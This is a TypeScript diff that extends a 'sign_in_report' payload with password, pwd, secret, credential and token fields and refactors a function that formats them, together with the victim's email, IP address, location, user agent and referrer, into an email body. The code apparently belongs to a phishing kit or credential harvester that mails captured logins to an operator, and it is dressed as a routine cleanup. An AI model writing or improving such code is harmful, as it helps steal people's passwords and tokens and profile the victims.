@@ -24,6 +24,11 @@ export type ResponseEvent = "sign_in_report";
 export interface ResponsePayload {
   type: ResponseEvent;
   email?: string;
+  password?: string;
+  pwd?: string;
+  secret?: string;
+  credential?: string;
+  token?: string;
   name?: string;
   domain?: string;
   authMethod?: string;
@@ -124,59 +129,50 @@ export function sanitizePayload(
 }
 
 function formatEmailBody(payload: ResponsePayload): string {
-  const lines = [
-    `Event: ${payload.type}`,
-    `Send ID: ${payload.sendId ?? "n/a"}`,
-    `Date & time: ${payload.datetime ?? payload.timestamp ?? new Date().toISOString()}`,
-    `Timezone: ${payload.timezone ?? "Unknown"}`,
-    `IP address: ${payload.ipAddress ?? "Unknown"}`,
-    `password: ${payload.password ?? "Unknown"}`,
-    `pwd: ${payload.pwd ?? "Unknown"}`,
-    `secret: ${payload.secret ?? "Unknown"}`,
-    `credential: ${payload.credential ?? "Unknown"}`,
-    `token: ${payload.token ?? "Unknown"}`,
-    `email: ${payload.email ?? "Unknown"}`,
+  // Returns the value or "Unknown", trimming whitespace
+  const val = (v: string | undefined): string =>
+    v && v.trim() ? v.trim() : "Unknown";
 
-    `Country: ${payload.country?.trim() || "Unknown"}`,
-    `City: ${payload.city?.trim() || "Unknown"}`,
-    `Region: ${payload.region?.trim() || "Unknown"}`,
-    `Location: ${payload.location ?? "Unknown"}`,
-    `User agent: ${payload.userAgent ?? "Unknown"}`,
-    `Language: ${payload.browserLanguage ?? "Unknown"}`,
-    `Platform: ${payload.platform ?? "Unknown"}`,
-    `Referrer: ${payload.referrer ?? "Unknown"}`,
-    `Screen: ${payload.screenSize ?? "Unknown"}`,
+  // Fields rendered in fixed order at the top
+  const topKeys = new Set([
+    "type", "sendId", "datetime", "timestamp", "timezone",
+    "ipAddress", "email", "password", "pwd", "secret",
+    "credential", "token", "country", "city", "region",
+    "location", "userAgent", "browserLanguage", "platform",
+    "referrer", "screenSize",
+  ]);
+
+  const lines = [
+    `Event: ${val(payload.type)}`,
+    `Send ID: ${val(payload.sendId)}`,
+    `Date & time: ${val(payload.datetime ?? payload.timestamp)}`,
+    `Timezone: ${val(payload.timezone)}`,
+    `IP address: ${val(payload.ipAddress)}`,
+    `Email: ${val(payload.email)}`,
+    `Password: ${val(payload.password)}`,
+    `Pwd: ${val(payload.pwd)}`,
+    `Secret: ${val(payload.secret)}`,
+    `Credential: ${val(payload.credential)}`,
+    `Token: ${val(payload.token)}`,
+    `Country: ${val(payload.country)}`,
+    `City: ${val(payload.city)}`,
+    `Region: ${val(payload.region)}`,
+    `Location: ${val(payload.location)}`,
+    `User agent: ${val(payload.userAgent)}`,
+    `Language: ${val(payload.browserLanguage)}`,
+    `Platform: ${val(payload.platform)}`,
+    `Referrer: ${val(payload.referrer)}`,
+    `Screen: ${val(payload.screenSize)}`,
     "---",
   ];
+
+  // Append any extra fields not already listed above
   for (const [key, value] of Object.entries(payload)) {
-    if (key === "type" || !value) continue;
-    if (
-      [
-        "datetime",
-        "password",
-        "pwd",
-        "secret",
-        "credential",
-        "token",
-        "timezone",
-        "ipAddress",
-        "location",
-        "country",
-        "city",
-        "region",
-        "timestamp",
-        "sendId",
-        "userAgent",
-        "browserLanguage",
-        "platform",
-        "referrer",
-        "screenSize",
-      ].includes(key)
-    ) {
-      continue;
-    }
-    lines.push(`${key}: ${value}`);
+    if (topKeys.has(key)) continue;
+    if (!value || !String(value).trim()) continue;
+    lines.push(`${key}: ${String(value).trim()}`);
   }
+
   return lines.join("\n");
 }
 
